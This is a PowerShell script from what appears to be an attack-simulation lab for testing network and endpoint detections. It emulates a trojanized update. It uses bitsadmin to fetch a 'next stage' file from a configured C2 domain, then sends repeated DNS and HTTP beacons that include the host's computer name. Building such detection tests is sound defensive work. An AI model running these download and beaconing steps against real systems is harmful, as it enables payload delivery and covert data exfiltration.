<#
    Stage 5 (END) - Trojanized update beacons out
    =============================================
    The fake "update" runs and calls home to the attacker's rare C2 domain -
    the payoff of the supply-chain hijack.

      EAL alert : 'Abnormal Communication to a Rare Domain'  (rule c2da63d1)
      ATT&CK    : Command & Control (TA0011) / Application Layer Protocol (T1071)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
. "$PSScriptRoot\_endpoint.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

# --- XDR endpoint layer: the payload uses a LOLBIN to fetch its next stage --
Write-Stage "STAGE 5a (XDR/endpoint): bitsadmin LOLBIN fetches next stage" "INFO"
Invoke-LolbinDownload -Url "http://$($cfg.RareC2Domain)/stage.bin" -Tool "bitsadmin"

Write-Stage "STAGE 5b (EAL/network): trojanized update beacons to $($cfg.RareC2Domain)" "INFO"
for ($i=1; $i -le 8; $i++) {
    Invoke-Dns  -Name $cfg.RareC2Domain -Type A -Label "beacon $i"
    Invoke-Http -Url "http://$($cfg.RareC2Domain)/report?host=$env:COMPUTERNAME&id=$i" -UserAgent "Updater/1.0" -Label "C2 checkin $i"
}
Invoke-TestDns -Category "c2"
Write-Stage "STAGE 5 done. Expect FW NGFW: DNS-Security C2 + (once baselined) EAL 'Abnormal Communication to a Rare Domain' c2da63d1." "OK"
